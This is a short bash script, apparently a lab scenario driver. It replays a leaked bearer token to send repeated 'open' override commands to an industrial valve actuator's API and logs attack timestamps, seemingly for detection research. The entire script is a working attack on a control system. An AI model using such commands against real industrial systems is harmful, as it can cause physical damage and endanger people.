#!/usr/bin/env bash
# S1 reference driver. Isolated lab only. Requires a per-run token from setup.
set -euo pipefail
: "${DTCR_TOKEN:?provide the per-run leaked token}"
TARGET="https://edge-02.lab:6443/api/v1/actuators/valve-07"
ONSET=$(date +%s.%N); echo "attack_onset_s=$ONSET" | tee -a run.log
for i in $(seq 1 12); do
  curl -sk -X POST "$TARGET" \
    -H "Authorization: Bearer ${DTCR_TOKEN}" \
    -H 'Content-Type: application/json' \
    -d '{"state":"open","override":true}' \
    -w "cmd=%{http_code} t=%{time_total}\n" | tee -a run.log
  sleep 5
done
echo "attack_end_s=$(date +%s.%N)" | tee -a run.log
